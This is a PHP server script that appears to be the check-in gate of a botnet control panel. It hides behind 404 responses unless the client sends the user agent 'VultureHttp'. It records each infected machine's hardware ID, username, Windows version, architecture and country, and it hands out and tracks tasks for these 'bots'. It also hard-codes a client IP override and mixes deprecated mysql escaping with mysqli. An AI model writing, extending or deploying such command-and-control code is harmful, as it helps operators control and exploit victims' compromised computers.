<?php
    include_once('include/functions.php');

    if($_SERVER['HTTP_USER_AGENT'] != 'VultureHttp') return404();
    if($_SERVER['REQUEST_METHOD'] != 'POST') return404();

    $strPostData = file_get_contents('php://input');

    if(empty($strPostData)) die;

    include_once("include/config.php");
    include_once('include/geoip.php');

	global $_mysqli;

	mysqli_select_db($_mysqli, $data['db']);
	
    $arr_strData = array();
    $tempBuffer = explode('&', $strPostData);

    for($i = 0; $i < count($tempBuffer) - 1; $i++)
    {
        $tempData = explode('=', $tempBuffer[$i]);

        $arr_strData[$tempData[0]] = mysql_real_escape_string($tempData[1]);
    }

    if(!isset($arr_strData['hwid'])) die;

    if(isset($arr_strData['username']) && isset($arr_strData['os']) && isset($arr_strData['arch'])) {
        $gi = geoip_open('include/GeoIP.dat', GEOIP_STANDARD);

        $_SERVER['REMOTE_ADDR'] = '85.254.158.170';

        $strCountryCode =  geoip_country_code_by_addr($gi, $_SERVER['REMOTE_ADDR']);

        if(empty($strCountryCode)) $strCountryCode = 'Unknown';

        $strCountryName = geoip_country_name_by_addr($gi, $_SERVER['REMOTE_ADDR']);

        if(empty($strCountryName)) $strCountryName = 'Unknown';

        if (!IsBotInDB($arr_strData['hwid'])) {
			$strQuery = sprintf("INSERT INTO clients(hwid, ip, countrycode, countryname, locale, winver, winarch, winpriv, compname, firstseen, lastseen, botversion) 
											  VALUES('%s', '%s', '%s', '%s', 'XX', %s, %s, 0, '%s', %s, %s, 0001)", 
			$arr_strData['hwid'], $_SERVER['REMOTE_ADDR'], $strCountryCode, $strCountryName, $arr_strData['os'], $arr_strData['arch'], $arr_strData['username'], time(), time());
			
            mysqli_query($_mysqli,$strQuery) or die(mysql_error());
        } else {
            $id = GetBotIDByHWID($arr_strData['hwid']);

            $strQuery = sprintf("UPDATE clients SET lastseen=%s WHERE botid='%s'", time(), $id);

            mysqli_query($_mysqli,$strQuery) or die(mysql_error());

            GetTaskByBot($id);
        }
        geoip_close($gi);
    }
    else if(isset($arr_strData['taskid']))
    {
        $id = GetBotIDByHWID($arr_strData['hwid']);

        if($id == '-1')
            die;

        SetTaskSuccessByBot($arr_strData['taskid']);

    }
?>